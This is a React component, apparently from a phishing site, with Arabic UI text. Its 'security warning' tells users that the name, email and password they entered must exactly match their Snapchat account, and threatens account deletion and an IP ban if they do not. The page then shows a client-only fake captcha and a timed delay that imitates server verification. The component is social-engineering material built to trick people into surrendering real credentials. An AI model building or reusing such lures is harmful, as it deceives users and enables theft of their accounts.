import React, { useState, useEffect } from 'react';
import { User } from '../types';
import { Input } from './ui/Input';
import { ShieldAlert, AlertTriangle, Lock, RefreshCw, ArrowLeft, Loader2, CheckCircle2 } from 'lucide-react';

interface VerificationStepProps {
  tempUser: User | null;
  onVerify: () => void;
  onBack: () => void;
}

export const VerificationStep: React.FC<VerificationStepProps> = ({ tempUser, onVerify, onBack }) => {
  const [captchaCode, setCaptchaCode] = useState('');
  const [userInput, setUserInput] = useState('');
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  // Generate random cyber-style captcha
  const generateCaptcha = () => {
    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
    let result = 'AKM-';
    for (let i = 0; i < 5; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    setCaptchaCode(result);
  };

  useEffect(() => {
    generateCaptcha();
  }, []);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (userInput.toUpperCase() !== captchaCode) {
      setError('رمز التحقق غير صحيح، حاول مرة أخرى');
      generateCaptcha();
      setUserInput('');
      return;
    }

    setIsLoading(true);
    
    // Simple delay to simulate server verification
    setTimeout(() => {
      onVerify();
    }, 2000);
  };

  return (
    <div className="w-full max-w-lg animate-fade-in relative">
        
      {/* Warning Card */}
      <div className="bg-red-500/10 border border-red-500/40 rounded-sm p-4 mb-6 backdrop-blur-sm relative overflow-hidden group hover:bg-red-500/20 transition-colors">
        <div className="absolute top-0 right-0 p-2 opacity-10 group-hover:opacity-20 transition-opacity">
           <AlertTriangle className="w-24 h-24 text-red-500" />
        </div>
        
        <div className="flex items-start gap-3 relative z-10">
          <ShieldAlert className="w-8 h-8 text-red-500 animate-pulse flex-shrink-0 mt-1" />
          <div>
            <h3 className="text-red-400 font-bold text-lg font-brand mb-1">تنبيه أمني هام</h3>
            <p className="text-gray-300 text-sm leading-relaxed text-right font-bold">
              يجب أن تتطابق البيانات المدخلة (الاسم، البريد، كلمة المرور) تماماً مع بيانات حسابك في <span className="text-yellow-400 font-brand">SNAPCHAT</span>.
            </p>
            <p className="text-red-300 text-xs mt-2 border-r-2 border-red-500 pr-2">
              سيقوم النظام بإجراء مطابقة آلية فورية، وفي حال اكتشاف اختلاف في البيانات سيتم <span className="underline font-bold">حذف الحساب فوراً</span> وحظر الـ IP.
            </p>
          </div>
        </div>
      </div>

      {/* Verification Form */}
      <div className="bg-[#151e32]/90 backdrop-blur-xl rounded-sm shadow-2xl p-8 border border-cyan-500/20 relative">
        <div className="text-center mb-6">
          <div className="inline-block p-3 rounded-full bg-cyan-900/20 border border-cyan-500/30 mb-3">
            <Lock className="w-6 h-6 text-cyan-400" />
          </div>
          <h2 className="text-2xl font-bold text-white font-brand">HUMAN VERIFICATION</h2>
          <p className="text-gray-400 text-xs font-mono mt-1">PLEASE PROVE YOU ARE NOT A ROBOT</p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-6">
          
          {/* Captcha Display */}
          <div className="relative group cursor-pointer" onClick={generateCaptcha} title="Click to refresh">
            <div className="w-full h-20 bg-black/50 border border-gray-600 rounded-lg flex items-center justify-center relative overflow-hidden select-none">
              {/* Noise Background */}
              <div className="absolute inset-0 opacity-20 bg-[url('https://grainy-gradients.vercel.app/noise.svg')]"></div>
              <div className="absolute inset-0 bg-grid opacity-10"></div>
              
              {/* The Code */}
              <span className="font-brand text-4xl font-bold tracking-[0.5em] text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 via-white to-purple-500 skew-x-12 blur-[0.5px]">
                {captchaCode}
              </span>
              
              {/* Scanline */}
              <div className="absolute inset-0 bg-gradient-to-b from-transparent via-white/5 to-transparent h-2 animate-scan pointer-events-none"></div>
              
              <div className="absolute bottom-2 right-2">
                 <RefreshCw className="w-4 h-4 text-gray-500 group-hover:text-white transition-colors" />
              </div>
            </div>
          </div>

          <Input
            label="أدخل الرمز الظاهر أعلاه"
            value={userInput}
            onChange={(e) => {
                setUserInput(e.target.value);
                setError('');
            }}
            placeholder="TYPE CODE HERE"
            error={error}
            className="text-center font-brand tracking-widest uppercase text-lg"
            maxLength={10}
            autoComplete="off"
            disabled={isLoading}
          />

          <div className="flex gap-3">
             <button
               type="button"
               onClick={onBack}
               disabled={isLoading}
               className="px-4 py-3 rounded-lg border border-gray-600 text-gray-400 hover:bg-gray-800 transition-colors disabled:opacity-50"
             >
                <ArrowLeft className="w-5 h-5" />
             </button>
             
             <button
                type="submit"
                disabled={isLoading}
                className={`
                  flex-1 py-3 px-4 bg-cyan-600 text-white font-bold rounded-lg transition-all flex items-center justify-center gap-2 group 
                  ${isLoading ? 'opacity-80 cursor-wait' : 'hover:bg-cyan-500 shadow-[0_0_20px_rgba(6,182,212,0.3)] hover:shadow-[0_0_30px_rgba(6,182,212,0.5)]'}
                `}
             >
                {isLoading ? (
                  <>
                    <Loader2 className="w-5 h-5 animate-spin" />
                    <span>جاري التحقق...</span>
                  </>
                ) : (
                  <>
                    <CheckCircle2 className="w-5 h-5" />
                    <span>تأكيد وإنشاء الحساب</span>
                  </>
                )}
             </button>
          </div>
        </form>
      </div>
    </div>
  );
};